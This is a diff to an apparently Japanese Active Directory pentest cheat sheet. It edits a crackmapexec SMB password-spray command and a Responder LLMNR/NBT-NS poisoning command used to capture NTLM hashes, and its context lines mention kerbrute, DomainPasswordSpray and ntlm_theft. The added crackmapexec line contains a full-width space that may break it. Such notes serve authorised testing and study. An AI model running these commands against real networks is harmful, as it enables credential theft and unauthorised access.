@@ -135,7 +135,7 @@ kerbrute passwordspray -d <DOMAIN_NAME> --dc <DC_IP> valid_users.txt '<PASSWORD_
 ### CrackMapExec
 SMBプロトコル経由で、ユーザーリストに対し単一のパスワードを試行し、成功したアカウントを特定
 ```shell
-crackmapexec smb <DC_IP> -u valid_users.txt -p '<PASSWORD_TO_SPRAY>' | grep '+'
+crackmapexec smb <DC_IP> -u valid_users.txt -p '<PASSWORD_TO_SPRAY>'　--continue-on-success
 ```
 ### DomainPasswordSpray
 PowerShellスクリプトで、ドメインユーザーに対してパスワードスプレー攻撃を実行
@@ -148,7 +148,7 @@ Invoke-DomainPasswordSpray -Password '<PASSWORD_TO_SPRAY>' -OutFile spray_succes
 ### Responder
 ネットワーク内でLLMNRやNBT-NSリクエストを偽装応答し、NTLMハッシュを奪取
 ```shell
-sudo responder -I <NIC> -dPv
+sudo responder -I <NIC> 
 ```
 ### ntlm_theft
 SMBに書き込みができる時に使用例あり
